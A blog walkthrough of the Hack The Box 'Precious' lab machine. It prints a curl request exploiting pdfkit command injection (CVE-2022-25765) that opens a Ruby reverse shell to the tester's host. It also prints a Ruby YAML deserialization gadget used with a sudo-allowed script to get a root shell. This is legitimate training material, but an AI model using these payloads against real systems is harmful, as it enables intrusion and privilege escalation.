---
title: "HTB - Precious Walkthrough"
date: 2023-06-15
author: Luigi Vezzoso
layout: post
tags: 
    - walkthrough
    - hackthebox
    - pentest
category: posts
---

Hi There!

here we go with a new walkthrough of [Hack The Box](https://app.hackthebox.com/) **Precious** Machine!

![precious-img](assets/postimages/precious/Precious.png)


## initial footprint
I start my analisys using black-box approach, and I need to figure out what type of server I have in front of me. Let's run our loved tool nmap.

{% highlight shell %}

Nmap 7.80 scan initiated Sun Feb 19 23:02:56 2023 as: nmap -p- -sV -oN precious.nmap precious.htb
Nmap scan report for precious.htb (10.10.11.189)
Host is up (0.056s latency).
Not shown: 65532 closed ports
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp    open     http    nginx 1.18.0
21040/tcp filtered unknown
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Feb 19 23:11:59 2023 -- 1 IP address (1 host up) scanned in 543.96 seconds
{% endhighlight %}

## service enumeration
The result of nmap scan shown a very little attack surface, in terms of exposed services, is available. 

### 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
We leave port 22 as last chance as usually it doesn't provide possibility to attack the box in a simple way due:
- encrypted traffic 
- auth required - brute force is time consuming
- very common and tested service - so not common exploit

### 80/tcp open http nginx 1.18.0
Opening the port 80 using standard browser we were able to access a website/web-application which seems to provide a service to convert a webpage into a pdf.

> note: I have added the fqdn of this website (precious.htb) into hosts file for a better name resolution (i.e. in case of redirects)

![precious-website](assets/postimages/precious/precious-website.png)

Let's try if this service is working or if it's just a static page :)  - Supposing that we cannot reach external links from HTB machine we are going to run a local HTTP server to respond requests. First we can create a very simple web page like the following example (webpage.html) then we can run a simple HTTP server using **python**.

{% highlight shell %}

xabaras@helix:~/workdir/ctf/htb/precious.htb$ cat webpage.html 
<html>
	<body>
		Hello World!
	</body>
</html>

xabaras@helix:~/workdir/ctf/htb/precious.htb$ python -m SimpleHTTPServer
Serving HTTP on 0.0.0.0 port 8000 ...



{% endhighlight %}

Using the browser we can try to request our webpage...

![precious-pdfconverte](assets/postimages/precious/local-pdfconvert.png)

and.... yes! The exposed service seems working fine converting our webpage to a PDF!

![precious-generated-pdf](assets/postimages/precious/generated_pdf.png)

The service is created using **pdfkit 0.8.6** - Usually dureing a pentest we have to identify all interaction point, all input data from the user, all the upload function, etc. The file upload function for PDF convertion appear like a good entry point. Let's dig more trying to understand how **pdfkit** is working. Searching on the Net first results are literaly vulnerability on the component..... we are facing to well know CVE.

![precious-cve](assets/postimages/precious/cve-2022-25765.png)

We should read carefully the POC code - The CVE is relative to a command injection on data submitted to service. We could try to inject a remote connetion to our listner. 



``xabaras@helix:~/workdir/ctf/htb/precious.htb$ curl 'precious.htb' -X POST -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,/;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: precious.htb' -H 'Connection: keep-alive' -H 'Referer: precious.htb' -H 'Upgrade-Insecure-Requests: 1' --data-raw 'url=http%3A%2F%2F10.10.14.184%3A8899%2F%3Fname%3D%2520%60+ruby+-rsocket+-e%27spawn%28%22sh%22%2C%5B%3Ain%2C%3Aout%2C%3Aerr%5D%3D%3ETCPSocket.new%28%2210.10.14.184%22%2C8899%29%29%27%60'``


Thanks to [https://github.com/PurpleWaveIO/CVE-2022-25765-pdfkit-Exploit-Reverse-Shell](https://github.com/PurpleWaveIO/CVE-2022-25765-pdfkit-Exploit-Reverse-Shell) for the already done job!

![precious-exploit](assets/postimages/precious/exploiting.png)

Boom we got a shell!

## Lateral moovemnt
Now starts the second phase of the attack: privilege escalation - after having compromising the service we got a shell for a non-admin user and we can get the user flag. The goal is to reach root privileges to complete the exercise.

First of all we can try to see which users are defined in the server looking to */etc/passwd* or doing *ls* on the */home/* folder. We are operating as the *ruby* user... so let's see on our home folder.

Let's try to have a look 

{% highlight shell %}

$ cd /home/ruby
cd /home/ruby
$ ls -la
ls -la
total 28
drwxr-xr-x 4 ruby ruby 4096 Feb 24 15:43 .
drwxr-xr-x 4 root root 4096 Oct 26 08:28 ..
lrwxrwxrwx 1 root root    9 Oct 26 07:53 .bash_history -> /dev/null
-rw-r--r-- 1 ruby ruby  220 Mar 27  2022 .bash_logout
-rw-r--r-- 1 ruby ruby 3526 Mar 27  2022 .bashrc
dr-xr-xr-x 2 root ruby 4096 Oct 26 08:28 .bundle
drwxr-xr-x 4 ruby ruby 4096 Feb 24 15:53 .cache
-rw-r--r-- 1 ruby ruby  807 Mar 27  2022 .profile
{% endhighlight %}

The only *not common* things is the *.bundle* folder. Let's dive in!

{% highlight shell %}

$ cd .bundle
cd .bundle
$ ls -la
ls -la
total 12
dr-xr-xr-x 2 root ruby 4096 Oct 26 08:28 .
drwxr-xr-x 4 ruby ruby 4096 Feb 24 15:43 ..
-r-xr-xr-x 1 root ruby   62 Sep 26 05:04 config


$ cat config
cat config
---
BUNDLE_HTTPS://RUBYGEMS__ORG/: "henry:XXXXXXXXXXXXX"
$ 

{% endhighlight %}

Boom! We found something that likely are the user credential.... and the user flag too!


{% highlight shell %}

xabaras@helix:~/workdir/ctf/htb/precious.htb$ ssh henry@precious.htb
henry@precious.htb's password: 
Linux precious 5.10.0-19-amd64 #1 SMP Debian 5.10.149-2 (2022-10-21) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Feb 24 15:57:50 2023 from 10.10.14.184
henry@precious:~$ ls -la
total 24
drwxr-xr-x 2 henry henry 4096 Oct 26 08:28 .
drwxr-xr-x 4 root  root  4096 Oct 26 08:28 ..
lrwxrwxrwx 1 root  root     9 Sep 26 05:04 .bash_history -> /dev/null
-rw-r--r-- 1 henry henry  220 Sep 26 04:40 .bash_logout
-rw-r--r-- 1 henry henry 3526 Sep 26 04:40 .bashrc
-rw-r--r-- 1 henry henry  807 Sep 26 04:40 .profile
-rw-r----- 1 root  henry   33 Feb 24 15:43 user.txt
henry@precious:~$ 

{% endhighlight %}

The goal is not to execute command with **root** privileges.... something like **sudo**... why do not have a look on sudo permission/configuration?

{% highlight shell %}

henry@precious:~$ sudo -l
Matching Defaults entries for henry on precious:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User henry may run the following commands on precious:
    (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
henry@precious:~$ 

{% endhighlight %}

And we see that the **henry** user can execute with **root** privileges *usr/bin/ruby /opt/update_dependencies.rb* script.

We should investigate deeper the script to understand the functionality... and first let's check writing permission on that.

{% highlight ruby %}

henry@precious:~$ cat /opt/update_dependencies.rb
# Compare installed dependencies with those specified in "dependencies.yml"
require "yaml"
require 'rubygems'

# TODO: update versions automatically
def update_gems()
end

def list_from_file
    YAML.load(File.read("dependencies.yml"))
end

def list_local_gems
    Gem::Specification.sort_by{ |g| [g.name.downcase, g.version] }.map{|g| [g.name, g.version.to_s]}
end

gems_file = list_from_file
gems_local = list_local_gems

gems_file.each do |file_name, file_version|
    gems_local.each do |local_name, local_version|
        if(file_name == local_name)
            if(file_version != local_version)
                puts "Installed version differs from the one specified in file: " + local_name
            else
                puts "Installed version is equals to the one specified in file: " + local_name
            end
        end
    end
end
henry@precious:~$ 

{% endhighlight %}

This script try to load list of ruby dependency from local file and it will try to check the variation from the installed one. The entry point (injection point) is the usage of *dependencies.yml* file. The function used to load dependency file is the **YAML.load**. Let's check again on the NET about the usage of the function.... and again we are facing to a possible well-know CVE!


[rce-ruby-yaml-load-updated/](https://staaldraad.github.io/post/2021-01-09-universal-rce-ruby-yaml-load-updated/)

Seems possible to craft a *dependencies.yml* file that will trigger a code execution... with the script provileges.. so *root* user in this case!


{% highlight ruby %}
dependency.yml

---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: /bin/bash
         method_id: :resolve
~           ```

{% endhighlight %}

Running the script using **sudo** we should be able to spawn a **root** shell.

{% highlight shell %}
sudo /usr/bin/ruby /opt/update_dependencies.rb

henry@precious:/tmp/.xab$ sudo /usr/bin/ruby /opt/update_dependencies.rb
sh: 1: reading: not found
root@precious:/tmp/.xab# id
uid=0(root) gid=0(root) groups=0(root)
root@precious:/tmp/.xab# 


{% endhighlight %}
















